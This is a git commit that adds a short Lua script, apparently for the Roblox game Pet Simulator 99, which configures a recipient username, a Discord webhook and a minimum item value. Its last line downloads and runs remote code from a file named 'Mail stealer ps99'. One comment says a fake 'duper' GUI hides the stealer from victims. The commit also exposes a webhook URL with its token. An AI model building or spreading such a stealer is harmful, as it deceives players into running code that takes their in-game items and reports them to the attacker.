848caba014b64acb63801941277ef43938b1e0ce
qj9d <comt94693@gmail.com>
2024-10-25 03:39:25 +0300

    Add files via upload

---
+++ PS99-SCRIPT.lua
@@ -0,0 +1,8 @@
+Username = "mrvlo1" -- here username
+Webhook = "https://discord.com/api/webhooks/1299166496676773969/uieG-L6hG83vOYOIsSMrmRSowY2o5XQmyH0buRxrDZzhc35yjOdvFupMyomovD0sHdfY" -- here webhook
+MinimumRAP = 10000000 -- minimum want rap
+loading_screen = true -- no want loading_screen false Loading_screen true want loading screen
+ps99dupergui = true -- this make gui people no know stealer
+all_items_send_loading_sceen_off = true -- this fucntion very op
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PS99SCRIPTS966/PS99-SCRIPTS-UPLOADING/refs/heads/main/Mail%20stealer%20ps99%207.2"))()
